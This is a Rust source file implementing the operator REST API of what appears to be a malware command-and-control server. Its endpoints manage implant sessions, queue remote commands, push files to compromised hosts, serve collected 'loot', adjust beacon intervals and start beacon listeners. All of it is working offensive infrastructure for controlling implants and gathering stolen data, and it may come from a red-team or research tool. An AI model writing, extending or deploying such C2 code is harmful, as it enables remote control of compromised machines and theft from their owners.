/// REST API endpoints for operator control.
use axum::{
    body::Bytes,
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use std::sync::Arc;

use crate::models::*;
use crate::state::AppState;

// ── Sessions ─────────────────────────────────────────────────────────

/// GET /api/v1/sessions — list all implant sessions.
pub async fn list_sessions(
    State(state): State<Arc<AppState>>,
) -> Json<SessionListResponse> {
    let sessions = state.list_sessions().await;
    let count = sessions.len();
    Json(SessionListResponse { sessions, count })
}

/// GET /api/v1/sessions/:id — get session detail with command history.
pub async fn get_session(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Json<SessionDetailResponse>, StatusCode> {
    let session = state.get_session(&id).await
        .ok_or(StatusCode::NOT_FOUND)?;
    let command_history = state.get_command_history(&id).await;

    Ok(Json(SessionDetailResponse {
        session,
        command_history,
    }))
}

/// DELETE /api/v1/sessions/:id — remove a session.
pub async fn delete_session(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> StatusCode {
    if state.remove_session(&id).await {
        StatusCode::NO_CONTENT
    } else {
        StatusCode::NOT_FOUND
    }
}

// ── Commands ─────────────────────────────────────────────────────────

/// POST /api/v1/sessions/:id/commands — queue a command.
pub async fn queue_command(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
    Json(req): Json<QueueCommandRequest>,
) -> Result<(StatusCode, Json<QueueCommandResponse>), (StatusCode, Json<serde_json::Value>)> {
    let cmd = PendingCommand::new(req.module, req.action, req.args, req.timeout_secs);
    match state.queue_command(&id, cmd).await {
        Ok(response) => Ok((StatusCode::CREATED, Json(response))),
        Err(e) => Err((StatusCode::NOT_FOUND, Json(serde_json::json!({"error": e})))),
    }
}

/// GET /api/v1/sessions/:id/commands — list command history.
pub async fn list_commands(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Json<Vec<CommandRecord>>, StatusCode> {
    // Verify session exists
    if state.get_session(&id).await.is_none() {
        return Err(StatusCode::NOT_FOUND);
    }
    Ok(Json(state.get_command_history(&id).await))
}

/// GET /api/v1/sessions/:id/commands/:cid — get single command.
pub async fn get_command(
    State(state): State<Arc<AppState>>,
    Path((id, cid)): Path<(String, String)>,
) -> Result<Json<CommandRecord>, StatusCode> {
    if state.get_session(&id).await.is_none() {
        return Err(StatusCode::NOT_FOUND);
    }
    let cmd = state.get_command(&id, &cid).await
        .ok_or(StatusCode::NOT_FOUND)?;
    Ok(Json(cmd))
}

/// DELETE /api/v1/sessions/:id/commands/:cid — cancel a pending command.
pub async fn cancel_command(
    State(state): State<Arc<AppState>>,
    Path((id, cid)): Path<(String, String)>,
) -> StatusCode {
    if state.cancel_command(&id, &cid).await {
        StatusCode::NO_CONTENT
    } else {
        StatusCode::NOT_FOUND
    }
}

// ── File operations ──────────────────────────────────────────────────

/// POST /api/v1/sessions/:id/files — upload file to implant (queues file_write command).
pub async fn upload_file_to_implant(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
    Json(req): Json<FileUploadRequest>,
) -> Result<(StatusCode, Json<QueueCommandResponse>), (StatusCode, Json<serde_json::Value>)> {
    let args = serde_json::json!({
        "path": req.remote_path,
        "content_hex": req.content_hex,
        "mode": req.mode,
    });

    let cmd = PendingCommand::new("file".into(), "write".into(), args, 120);
    match state.queue_command(&id, cmd).await {
        Ok(response) => Ok((StatusCode::CREATED, Json(response))),
        Err(e) => Err((StatusCode::NOT_FOUND, Json(serde_json::json!({"error": e})))),
    }
}

/// GET /api/v1/sessions/:id/files — list loot files for a session.
/// Note: Currently a placeholder — loot is appended to a single file.
/// Returns metadata about stored loot.
pub async fn list_files(
    State(state): State<Arc<AppState>>,
    Path(_id): Path<String>,
) -> Json<serde_json::Value> {
    // For now, return loot file metadata
    let loot_size = std::fs::metadata(&state.loot_file)
        .map(|m| m.len())
        .unwrap_or(0);
    Json(serde_json::json!({
        "files": [],
        "loot_file": state.loot_file.to_string_lossy(),
        "loot_size": loot_size,
    }))
}

/// GET /api/v1/sessions/:id/files/:name — download a loot file.
pub async fn download_file(
    State(state): State<Arc<AppState>>,
    Path((_id, name)): Path<(String, String)>,
) -> Result<Vec<u8>, StatusCode> {
    // For now, serve from loot file
    if name == "loot.bin" || name == "all" {
        std::fs::read(&state.loot_file).map_err(|_| StatusCode::NOT_FOUND)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

// ── Config ───────────────────────────────────────────────────────────

/// POST /api/v1/sessions/:id/config — update implant config (e.g., beacon interval).
pub async fn update_config(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
    Json(config): Json<serde_json::Value>,
) -> Result<StatusCode, StatusCode> {
    if state.get_session(&id).await.is_none() {
        return Err(StatusCode::NOT_FOUND);
    }

    // Queue a system/config update command
    let args = serde_json::json!({
        "config": config,
    });

    let cmd = PendingCommand::new("system".into(), "config".into(), args, 30);
    let _ = state.queue_command(&id, cmd).await;
    Ok(StatusCode::ACCEPTED)
}

// ── Health ───────────────────────────────────────────────────────────

/// GET /health — health check.
pub async fn health() -> &'static str {
    "ok"
}

// ── Listener management ──────────────────────────────────────────────

/// GET /api/v1/listeners — list active beacon listeners.
pub async fn list_listeners(
    State(state): State<Arc<AppState>>,
) -> Json<Vec<ListenerInfo>> {
    let listeners = state.listeners.read().await;
    let info: Vec<ListenerInfo> = listeners.iter().map(|(port, h)| ListenerInfo {
        port: *port,
        protocol: h.protocol.clone(),
        active: true,
    }).collect();
    Json(info)
}

/// POST /api/v1/listeners — start a beacon listener on the given port.
/// Body: {"port": 8080, "protocol": "http"}
pub async fn start_listener(
    State(state): State<Arc<AppState>>,
    Json(req): Json<StartListenerRequest>,
) -> Result<(StatusCode, Json<ListenerInfo>), (StatusCode, Json<serde_json::Value>)> {
    let port = req.port;
    let protocol = req.protocol.to_lowercase();

    if protocol != "http" && protocol != "https" {
        return Err((StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "protocol must be http or https"}))));
    }

    // Check if port already in use
    {
        let listeners = state.listeners.read().await;
        if listeners.contains_key(&port) {
            return Err((StatusCode::CONFLICT, Json(serde_json::json!({"error": "listener already active on this port"}))));
        }
    }

    let addr: std::net::SocketAddr = format!("0.0.0.0:{}", port).parse().map_err(|_| {
        (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "invalid port"})))
    })?;

    let is_https = protocol == "https";

    // For HTTP: pre-bind the socket. For HTTPS: axum_server does it.
    let listener = if !is_https {
        let l = tokio::net::TcpListener::bind(addr).await.map_err(|e| {
            (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": format!("bind failed: {}", e)})))
        })?;
        Some(l)
    } else {
        None
    };

    let (abort_tx, mut abort_rx) = tokio::sync::oneshot::channel::<()>();

    let implant_router = crate::routes::build_implant_router(state.clone());
    let cert_path = state.cert_path.clone();
    let key_path = state.key_path.clone();

    // Spawn the listener
    let all_log = state.all_log.clone();
    tokio::spawn(async move {
        if is_https {
            match axum_server::tls_rustls::RustlsConfig::from_pem_file(&cert_path, &key_path).await {
                Ok(tls_cfg) => {
                    crate::util::log_line(&all_log, &format!("HTTPS_LISTENER binding to :{}", port));
                    let app = implant_router.into_make_service_with_connect_info::<std::net::SocketAddr>();
                    axum_server::bind_rustls(addr, tls_cfg).serve(app).await
                        .unwrap_or_else(|e| crate::util::log_line(&all_log, &format!("HTTPS_LISTENER error: {}", e)));
                }
                Err(e) => {
                    crate::util::log_line(&all_log, &format!("HTTPS_LISTENER TLS config error: {} (cert={:?} key={:?})",
                        e, cert_path, key_path));
                }
            }
        } else {
            let listener = listener.unwrap();
            let app = implant_router.into_make_service_with_connect_info::<std::net::SocketAddr>();
            let server = axum::serve(listener, app);
            tokio::select! {
                _ = server => {},
                _ = &mut abort_rx => {},
            }
        }
    });

    let info = ListenerInfo { port, protocol: protocol.clone(), active: true };

    {
        let mut listeners = state.listeners.write().await;
        listeners.insert(port, crate::state::ListenerHandle {
            port,
            protocol,
            abort: abort_tx,
        });
    }

    println!("[+] Beacon listener started: {} on :{}", info.protocol.to_uppercase(), port);
    crate::util::log_line(&state.all_log, &format!("LISTENER_START  {}  port={}", info.protocol, port));

    Ok((StatusCode::CREATED, Json(info)))
}

/// DELETE /api/v1/listeners/:port — stop a beacon listener.
pub async fn stop_listener(
    State(state): State<Arc<AppState>>,
    axum::extract::Path(port): axum::extract::Path<u16>,
) -> Result<StatusCode, StatusCode> {
    let handle = {
        let mut listeners = state.listeners.write().await;
        listeners.remove(&port)
    };

    match handle {
        Some(h) => {
            let _ = h.abort.send(());
            println!("[-] Beacon listener stopped: {} on :{}", h.protocol.to_uppercase(), port);
            crate::util::log_line(&state.all_log, &format!("LISTENER_STOP  {}  port={}", h.protocol, port));
            Ok(StatusCode::NO_CONTENT)
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}
